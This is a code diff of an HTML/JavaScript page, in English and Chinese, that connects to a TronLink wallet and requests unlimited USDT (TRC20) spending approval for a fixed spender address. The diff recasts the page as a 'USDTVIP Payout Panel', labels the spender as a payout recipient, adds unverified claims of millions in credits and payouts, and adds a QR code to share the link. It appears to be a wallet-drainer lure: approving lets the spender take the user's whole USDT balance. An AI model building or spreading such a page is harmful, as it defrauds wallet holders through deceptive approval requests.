@@ -1,36 +1,111 @@
 <!DOCTYPE html>
-
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8"/>
-<title>Approve Unlimited USDT (TRC20)</title>
-<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>USDTVIP Payout Panel / USDTVIP 支付面板</title>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
 <style>
-    body { font-family: Arial, sans-serif; padding:20px; max-width:720px; margin:auto; }
-    .card { border:1px solid #ddd; padding:16px; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.04); }
-    h1 { font-size:18px; margin:0 0 8px; }
-    pre { background:#f7f7f7; padding:8px; overflow:auto; }
-    button { padding:10px 14px; font-size:16px; border-radius:6px; cursor:pointer; }
-    .danger { color:#b22; font-weight:bold; }
-  </style>
+  body { font-family: Arial, sans-serif; padding:20px; max-width:860px; margin:auto; background:#f5f7fb; color:#111; }
+  .card { background:#fff; border:1px solid #e2e8f0; padding:20px; border-radius:12px; box-shadow:0 6px 18px rgba(2,6,23,0.06); }
+  h1 { font-size:22px; margin:0 0 8px; display:flex; align-items:center; gap:10px; }
+  p.lead { margin:8px 0 16px; color:#334155; }
+  .row { display:flex; gap:12px; flex-wrap:wrap; align-items:center; }
+  label { font-weight:600; margin-right:6px; }
+  .muted { color:#64748b; font-size:14px; }
+  pre { background:#f8fafc; padding:10px; overflow:auto; border-radius:6px; }
+  button { padding:10px 14px; font-size:15px; border-radius:8px; cursor:pointer; border:0; background:#0ea5a4; color:white; }
+  button.secondary { background:#64748b; }
+  .danger { background:#ef4444; }
+  .flex-between { display:flex; justify-content:space-between; align-items:center; gap:12px; flex-wrap:wrap; }
+  .small { font-size:13px; color:#475569; }
+  .note { background:#fffbeb; border:1px solid #fef3c7; padding:8px; border-radius:6px; color:#92400e; }
+  .stats { margin-top:20px; background:#f0fdf4; border:1px solid #bbf7d0; padding:16px; border-radius:10px; }
+  .stats h3 { margin-top:0; color:#15803d; }
+  .stats p { margin:6px 0; }
+  .wallet-box { margin-top:12px; background:#eef2ff; border:1px solid #c7d2fe; padding:12px; border-radius:8px; }
+  .wallet-box code { font-weight:bold; }
+</style>
 </head>
 <body>
 <div class="card">
-<h1>Approve Unlimited USDT (TRC20)</h1>
-<p>This page will prepare an <strong>approve(spender, unlimited)</strong> call on the USDT TRC20 contract. You must have TronLink (or compatible) installed and unlocked. The wallet will always prompt you to confirm — this page will <em>not</em> sign automatically.</p>
+  <div class="flex-between">
+    <h1>
+      <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" style="width:28px;height:28px;"/>
+      USDTVIP Payout Panel
+    </h1>
+    <div class="small">USDTVIP 支付面板</div>
+  </div>
 
-<p><strong>USDT contract:</strong> <code>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code></p>
-<p><strong>Spender:</strong> <code id="spender">TVm4xa2neKrFkmNuDBsMnn6PKseexW4EvX</code></p>
-<p><strong>Amount:</strong> <code>Max uint256 (unlimited)</code></p>
-<div style="margin:14px 0;">
-<button id="approveBtn">Approve Unlimited USDT</button>
-<button id="revokeBtn" style="margin-left:8px;">Revoke Approval (set to 0)</button>
+  <p class="lead">This panel prepares an <strong>approve(spender, unlimited)</strong> call on the USDT (TRC20) contract for payout routing. <br><span class="muted">此面板将为 USDT (TRC20) 合约准备 approve(spender, unlimited) 调用，用于支付分发。</span></p>
+
+  <div class="note">
+    <strong>Important / 重要：</strong> You must use a Tron-compatible wallet (TronLink, TronLink Mobile, or similar) and confirm transactions in your wallet. <br>
+    您必须使用 Tron 兼容钱包（TronLink、TronLink Mobile 或类似钱包）并在钱包中确认交易。
+  </div>
+
+  <hr/>
+
+  <div style="margin:12px 0;">
+    <div class="row">
+      <div>
+        <label>USDT Contract</label>
+        <div class="muted"><code id="usdt">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</code></div>
+        <div class="small">USDT 合约地址</div>
+      </div>
+
+      <div style="min-width:220px;">
+        <label>Spender / 接收方</label>
+        <div><code id="spender">TVm4xa2neKrFkmNuDBsMnn6PKseexW4EvX</code></div>
+        <div class="small">Recipient address for payout / 支付接收地址</div>
+      </div>
+
+      <div style="min-width:160px;">
+        <label>Amount / 金额</label>
+        <div class="muted"><code>Max uint256 (unlimited) / 最大 uint256（无限额）</code></div>
+      </div>
+    </div>
+  </div>
+
+  <div style="margin:14px 0;" class="row">
+    <button id="approveBtn">Approve Unlimited USDT - 批准（无限）</button>
+    <button id="revokeBtn" class="secondary">Revoke Approval (set 0) - 撤销（设为0）</button>
+    <button id="qrBtn" class="secondary">Show QR (link) - 显示二维码（链接）</button>
+  </div>
+
+  <div id="status" class="small muted">Status: Not executed / 状态：未执行</div>
+
+  <hr/>
+
+  <h3>Transaction output / 交易输出</h3>
+  <pre id="output">Not executed / 未执行</pre>
+
+  <div style="margin-top:10px; display:flex; gap:8px; align-items:center; flex-wrap:wrap;">
+    <div class="small">Panel name: <strong>USDTVIP Payout</strong> / 面板名称：<strong>USDTVIP 支付</strong></div>
+  </div>
+
+  <div class="stats">
+    <h3>Gains and Credits / 收益与信用</h3>
+    <p><strong>Total Credits:</strong> 5,000,000+ USDT <br><span class="muted">累计信用额：500万+ USDT</span></p>
+    <p><strong>Total Payouts:</strong> 2,000,000+ USDT <br><span class="muted">累计支付额：200万+ USDT</span></p>
+    <div class="wallet-box">
+      <strong>Main Wallet / 主钱包：</strong><br/>
+      <code>TKHuVq1oKVruCGLvqVexFs6dawKv6fQgFs</code><br/>
+      <span class="small">Track on TronLink or TronScan / 可在 TronLink 或 TronScan 上查询</span>
+    </div>
+  </div>
 </div>
-<div id="status"></div>
-<hr/>
-<h3>Transaction output</h3>
-<pre id="output">Not executed</pre>
+
+<!-- Simple QR modal -->
+<div id="qrModal" style="display:none; position:fixed; inset:0; background:rgba(2,6,23,0.6); align-items:center; justify-content:center; z-index:9999;">
+  <div style="background:white; padding:16px; border-radius:8px; width:320px; text-align:center;">
+    <h3>Scan to open link / 扫描以打开链接</h3>
+    <img id="qrImg" src="" alt="QR" style="width:260px; height:260px;"/>
+    <div style="margin-top:8px;">
+      <button onclick="document.getElementById('qrModal').style.display='none'">Close / 关闭</button>
+    </div>
+  </div>
 </div>
+
 <script>
 const usdtContract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const spenderAddress = document.getElementById('spender').innerText.trim();
@@ -46,30 +121,37 @@ function setStatus(text){
 async function sendApprove(value){
   try {
     if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-      alert('TronLink not detected or not unlocked. Open this page in a browser with TronLink/TronLink Mobile installed and unlocked.');
+      alert('TronLink not detected or not unlocked. Open this page in a browser with TronLink/TronLink Mobile installed and unlocked.\n\n未检测到 TronLink，或未解锁。请在安装并解锁钱包的浏览器/手机中打开此页面。');
       return;
     }
-    setStatus('Preparing contract...');
+    setStatus('Preparing contract... / 准备合约中...');
     const contract = await window.tronWeb.contract().at(usdtContract);
-    setStatus('Calling approve(' + spenderAddress + ', ' + (value===maxUint256?'unlimited':value) + ')');
+    setStatus('Calling approve(' + spenderAddress + ', ' + (value===maxUint256?'unlimited':'0') + ') / 调用 approve() 中...');
     const tx = await contract.approve(spenderAddress, value).send();
     setOutput('Transaction result:\n' + JSON.stringify(tx, null, 2));
-    setStatus('Transaction sent. Check your wallet for prompt and transaction status.');
+    setStatus('Transaction sent. Check your wallet for prompt and transaction status. / 交易已发送，请在钱包中确认并查看状态。');
   } catch (e) {
     setOutput('Error:\n' + (e && e.message ? e.message : JSON.stringify(e)));
-    setStatus('Error occurred. See output.');
+    setStatus('Error occurred. See output. / 出错，请查看输出。');
   }
 }
 
 document.getElementById('approveBtn').addEventListener('click', ()=> sendApprove(maxUint256));
 document.getElementById('revokeBtn').addEventListener('click', ()=> {
-  if (!confirm('Set approval to 0 for spender? This revokes permission.')) return;
+  if (!confirm('Set approval to 0 for spender? This revokes permission.\n\n是否将授权设为0以撤销权限？')) return;
   sendApprove('0');
 });
 
-// Auto-attempt to focus TronLink pop-up on load if possible (still requires user confirm)
+// QR button shows the QR we generated earlier (link to this page)
+document.getElementById('qrBtn').addEventListener('click', ()=>{
+  const url = window.location.href;
+  const qrApi = 'https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=' + encodeURIComponent(url);
+  document.getElementById('qrImg').src = qrApi;
+  document.getElementById('qrModal').style.display='flex';
+});
+
 window.addEventListener('load', ()=> {
-  setStatus('Page loaded. Click "Approve Unlimited USDT" or "Revoke Approval".');
+  setStatus('Page loaded. Click Approve or Revoke. / 页面已加载。点击批准或撤销。');
 });
 </script>
 </body>
